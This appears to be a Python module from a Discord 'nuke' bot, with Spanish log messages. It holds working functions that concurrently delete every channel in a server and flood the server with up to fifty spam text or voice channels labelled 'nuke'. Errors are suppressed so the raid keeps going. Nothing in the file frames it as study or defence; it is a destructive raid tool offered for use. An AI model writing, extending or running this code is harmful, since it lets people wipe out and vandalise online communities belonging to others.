"""Operaciones sobre canales."""
from __future__ import annotations

import discord

from .utils import human, pool

MAX_CHANNELS = 50


async def destroy_channels(guild: discord.Guild, *, concurrency: int = 4, log=print) -> int:
    channels = list(guild.channels)
    log(f"Borrando {human(len(channels))} canales...")
    await pool(channels, lambda ch, _i: ch.delete(reason="nuke"), concurrency)
    return len(channels)


async def spam_channels(guild, count: int, *, kind: str = "text", name: str = "nuke",
                        category=None, concurrency: int = 3, log=print) -> list:
    """Crea hasta MAX_CHANNELS canales y devuelve la lista creada."""
    count = max(1, min(count, MAX_CHANNELS))
    log(f"Creando {human(count)} canales de {kind}...")

    created: list = []
    lock = __import__("asyncio").Lock()

    async def create(index):
        label = f"{name}-vc-{index}" if kind == "voice" else f"{name}-{index}"
        try:
            if kind == "voice":
                channel = await guild.create_voice_channel(label, category=category, reason="nuke")
            else:
                channel = await guild.create_text_channel(label, category=category, reason="nuke")
            async with lock:
                created.append(channel)
        except Exception:
            pass

    await pool(range(1, count + 1), lambda item, _i: create(item), concurrency)
    return created


async def create_category(guild, name: str):
    try:
        return await guild.create_category(name, reason="nuke")
    except Exception:
        return None
